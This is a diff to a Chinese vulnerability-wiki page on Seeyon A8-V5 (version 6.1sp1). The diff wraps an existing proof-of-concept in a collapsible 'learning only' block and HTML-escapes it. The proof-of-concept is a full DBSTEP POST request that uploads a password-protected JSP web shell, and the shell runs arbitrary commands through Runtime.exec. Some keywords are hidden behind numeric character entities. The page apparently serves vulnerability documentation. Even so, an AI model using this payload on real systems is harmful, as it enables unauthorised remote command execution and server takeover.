@@ -45,8 +45,10 @@ title="致远A8-V5协同管理软件 V6.1sp1"
 
 使用POST请求发出如下请求包
 
-```
-DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV
 OPTION=S3WYOSWLBSGr
 currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
 CREATEDATE=wUghPB3szB3Xwg66
@@ -56,9 +58,10 @@ originalCreateDate=wUghPB3szB3Xwg66
 FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6
 needReadFile=yRWZdAS6
 originalCreateDate=wLSGP4oEzLKAz4=iz=66
-<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if("calsee".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("
-<pre>"+excuteCmd(request.getParameter("cmd")) + "</pre>");}else{out.println(":-)");}%>>a6e4f045d4b8506bf492ada7e3390d7ce
-```
+&lt;%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%&gt;&lt;%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = &#82;untime.getRuntime().&#101;xec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %&gt;&lt;%if("calsee".equals(request.getParameter("pwd"))&amp;&amp;!"".equals(request.getParameter("cmd"))){out.println("
+&lt;pre&gt;"+excuteCmd(request.getParameter("cmd")) + "&lt;/pre&gt;");}else{out.println(":-)");}%&gt;&gt;a6e4f045d4b8506bf492ada7e3390d7ce</code></pre>
+
+</details>
 
 ![image-20220520153242842](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201532919.png)
 
